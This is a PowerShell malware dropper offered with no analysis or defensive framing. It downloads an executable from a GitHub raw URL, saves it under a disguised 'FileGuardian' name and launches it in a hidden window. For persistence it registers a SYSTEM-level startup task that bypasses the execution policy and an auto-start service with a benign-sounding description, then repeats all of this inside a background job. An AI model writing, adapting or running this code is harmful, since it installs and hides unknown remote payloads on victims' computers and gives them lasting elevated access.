# 📌 Variables:
$FileURL       = "https://raw.githubusercontent.com/wetiee/oculushelp/main/rapid.exe"
$TargetPath    = "$env:LOCALAPPDATA\FileGuardian\katysaneur.exe"
$LaunchDelay   = 3
$WindowStyle   = "Hidden"

$TaskName       = "FileGuardianTask"
$ServiceName    = "FileGuardianService"

# 📌 Function: Set persistence via Scheduled Task and Service
function Set-Persistence {
    try {
        # Create the target directory if it doesn't exist
        $targetDir = [System.IO.Path]::GetDirectoryName($TargetPath)
        if (-not (Test-Path $targetDir)) {
            New-Item -ItemType Directory -Path $targetDir -Force
        }

        # Create a scheduled task for persistence
        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-windowstyle $WindowStyle -executionpolicy bypass -file `"$MyInvocation.MyCommand.Path`""
        $trigger = New-ScheduledTaskTrigger -AtStartup
        $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
        $task = New-ScheduledTask -Action $action -Trigger $trigger -Principal $principal -Settings $settings
        Register-ScheduledTask -TaskName $TaskName -InputObject $task -Force

        # Create a Windows service for persistence
        $servicePath = "$env:SystemRoot\System32\svchost.exe"
        $serviceArgs = "-k netsvcs -p -s $ServiceName"
        $service = New-Service -Name $ServiceName -BinaryPathName "$servicePath $serviceArgs" -StartupType Automatic -Description "File Guardian Service"
        Start-Service -Name $ServiceName

        Write-Host "[+] Persistence established."
    }
    catch {
        Write-Host "[!] Failed to set persistence: $_"
    }
}

# 📌 Function: Download & Run file (always run, download if missing)
function Run-Payload {
    try {
        if (-not (Test-Path $TargetPath)) {
            Write-Host "[*] File not found — downloading..."
            Invoke-WebRequest -Uri $FileURL -OutFile $TargetPath
        }

        Start-Sleep -Seconds $LaunchDelay

        # Execute downloaded file hidden
        Start-Process -FilePath $TargetPath -WindowStyle $WindowStyle

        Write-Host "[+] Executed: $TargetPath"
    }
    catch {
        Write-Host "[!] Failed to download or launch file: $_"
    }
}

# 📌 Main execution:
# Consolidate operations into a single function and run it as a background job
$jobScript = {
    param ($FileURL, $TargetPath, $LaunchDelay, $WindowStyle, $TaskName, $ServiceName)

    # Set persistence
    function Set-Persistence {
        try {
            # Create the target directory if it doesn't exist
            $targetDir = [System.IO.Path]::GetDirectoryName($TargetPath)
            if (-not (Test-Path $targetDir)) {
                New-Item -ItemType Directory -Path $targetDir -Force
            }

            # Create a scheduled task for persistence
            $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-windowstyle $WindowStyle -executionpolicy bypass -file `"$MyInvocation.MyCommand.Path`""
            $trigger = New-ScheduledTaskTrigger -AtStartup
            $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
            $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
            $task = New-ScheduledTask -Action $action -Trigger $trigger -Principal $principal -Settings $settings
            Register-ScheduledTask -TaskName $TaskName -InputObject $task -Force

            # Create a Windows service for persistence
            $servicePath = "$env:SystemRoot\System32\svchost.exe"
            $serviceArgs = "-k netsvcs -p -s $ServiceName"
            $service = New-Service -Name $ServiceName -BinaryPathName "$servicePath $serviceArgs" -StartupType Automatic -Description "File Guardian Service"
            Start-Service -Name $ServiceName

            Write-Host "[+] Persistence established."
        }
        catch {
            Write-Host "[!] Failed to set persistence: $_"
        }
    }

    # Download and run the payload
    function Run-Payload {
        try {
            if (-not (Test-Path $TargetPath)) {
                Write-Host "[*] File not found — downloading..."
                Invoke-WebRequest -Uri $FileURL -OutFile $TargetPath
            }

            Start-Sleep -Seconds $LaunchDelay

            # Execute downloaded file hidden
            Start-Process -FilePath $TargetPath -WindowStyle $WindowStyle

            Write-Host "[+] Executed: $TargetPath"
        }
        catch {
            Write-Host "[!] Failed to download or launch file: $_"
        }
    }

    # Run the functions
    Set-Persistence
    Run-Payload
}

# Start the background job with the consolidated script
$job = Start-Job -ScriptBlock $jobScript -ArgumentList $FileURL, $TargetPath, $LaunchDelay, $WindowStyle, $TaskName, $ServiceName

# Wait for the job to complete
Wait-Job -Job $job

# Clean up the job
Remove-Job -Job $job